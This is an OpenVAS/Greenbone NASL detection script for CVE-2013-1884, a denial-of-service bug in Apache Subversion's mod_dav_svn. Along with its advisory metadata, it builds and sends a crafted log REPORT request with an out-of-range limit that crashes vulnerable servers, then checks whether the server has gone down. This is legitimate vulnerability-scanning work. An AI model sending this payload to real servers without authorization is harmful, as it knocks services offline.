# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802054");
  script_version("2024-01-26T05:05:14+0000");
  script_cve_id("CVE-2013-1884");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2024-01-26 05:05:14 +0000 (Fri, 26 Jan 2024)");
  script_tag(name:"creation_date", value:"2013-06-06 15:08:09 +0530 (Thu, 06 Jun 2013)");
  script_name("Apache Subversion 'mod_dav_svn' log REPORT Request DoS Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/52966/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/58898");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/83259");
  script_xref(name:"URL", value:"http://subversion.apache.org/security/CVE-2013-1884-advisory.txt");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Apache_SVN/banner");

  script_tag(name:"affected", value:"Apache Subversion 1.7.0 through 1.7.8");

  script_tag(name:"insight", value:"An error within the 'mod_dav_svn' module when handling crafted log 'REPORT'
  request with a limit outside the allowed range.");

  script_tag(name:"solution", value:"Upgrade to Apache Subversion version 1.7.9 or later.");

  script_tag(name:"summary", value:"Apache Subversion is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"impact", value:"Successful exploitation will let the remote attackers to cause a segfault
  by sending crafted log 'REPORT' request.

  NOTE : Configurations which allow anonymous read access to the repository
  will be vulnerable to this without authentication.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);

banner = http_get_remote_headers(port: port);
if(!banner || banner !~ "Server\s*:\s*Apache.* SVN")
  exit(0);

useragent = http_get_user_agent();
host = http_host_name(port:port);

if(http_is_dead(port:port))
  exit(0);

comman_data = string('<?xml version="1.0" encoding="UTF-8"?>\n',
                     '<S:log-report xmlns:S="svn:">\n',
                     '<S:start-revision>0</S:start-revision>\n',
                     '<S:end-revision>1</S:end-revision>\n');

# nb: Limit proper allowed range
limit_inside = string(comman_data, '<S:limit>1</S:limit>\n',
                      '</S:log-report>\n');

# nb: Limit outside the allowed range
limit_outside = string(comman_data,
                       '<S:limit>123456789123456789123456789</S:limit>\n',
                       '</S:log-report>\n');

foreach dir(make_list_unique("/", "/repo", "/repository", "/trunk", "/svn",
                             "/svn/trunk", "/repo/trunk", "/repo/projects",
                             "/projects", "/svn/repos", http_cgi_dirs(port:port))) {

  if(dir == "/")
    dir = "";

  url = dir + "/";
  req1 = http_get(item:url, port:port);
  res1 = http_keepalive_send_recv(port:port, data:req1);
  if(!res1 || res1 !~ "^HTTP/1\.[01] 200")
    continue;

  # nb: Send normal request and check for normal response to confirm. Subversion is working as expected.
  common_req = string("REPORT ", url, '!svn/bc/1/', " HTTP/1.1", "\r\n",
                      "User-Agent: ", useragent, "\r\n",
                      "Host: ", host, "\r\n",
                      "Accept: */*\r\n");

  normal_req = string(common_req, "Content-Length: ", strlen(limit_inside),
                      "\r\n\r\n", limit_inside);
  normal_res = http_keepalive_send_recv(port:port, data:normal_req);

  if(normal_res !~ "^HTTP/1\.[01] 200" && "<S:log-report" >!< normal_res)
    continue;

  # nb: Some time Apache servers will re-spawn the listener processes. Send a crafted limit that is
  # out of the allowed range and check for the response. If no response is received then a
  # Segmentation fault occurred.
  crafted_req = string(common_req, "Content-Length: ", strlen(limit_outside),
                       "\r\n\r\n", limit_outside);
  crafted_res = http_keepalive_send_recv(port:port, data:crafted_req);

  # nb: Patched version repose HTTP/1.1 400 Bad Request and human-readable errcode=
  if(crafted_res =~ "^HTTP/1\.[01] 400" && "human-readable errcode=" >< crafted_res)
    exit(0);

  # nb: some times response has "\r\n" hence check strlen(crafted_res) < 3
  # nb: Trying 2 times to make sure the server is not responding
  if(isnull(crafted_res) || strlen(crafted_res) < 3) {
    crafted_res = http_keepalive_send_recv(port:port, data:crafted_req);
    if(isnull(crafted_res) || strlen(crafted_res) < 3) {
      security_message(port:port);
      exit(0);
    }
  }

  # nb: If HTTP did not re-spawn the listener processes
  if(http_is_dead(port:port)) {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
